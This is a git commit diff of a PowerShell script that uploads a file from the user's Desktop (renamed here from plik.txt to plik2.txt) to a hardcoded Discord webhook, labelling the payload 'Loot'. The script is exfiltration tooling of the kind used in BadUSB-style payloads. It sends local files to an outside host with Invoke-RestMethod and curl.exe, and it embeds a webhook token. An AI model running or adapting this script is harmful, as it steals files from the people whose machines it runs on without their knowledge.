5b532285cb243e129a0a20268a8a33f69940629a
Lightwere <98146549+Lightwere@users.noreply.github.com>
2025-10-19 18:23:27 +0200

    Update upload_plik_from_desktop2.ps1

--- upload_plik_from_desktop2.ps1
+++ upload_plik_from_desktop2.ps1
@@ -8,11 +8,11 @@ param (
 )
 $hookurl = 'https://discord.com/api/webhooks/1428302116455186532/dOdkUVnlx0Av1blb5VRDr4-JrUH_Hdta2cTM6m7HJ1oHPV1Mc2DfFwd6x3b1WT0_Gfzp'
 $Body = @{
-  'Loot' = plik.txt
+  'Loot' = plik2.txt
   'content' = $text
 }
 if (-not ([string]::IsNullOrEmpty($text))){
 Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
 if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
 }
-Upload-Discord -file "$env:USERPROFILE\Desktop\plik.txt"
+Upload-Discord -file "$env:USERPROFILE\Desktop\plik2.txt"
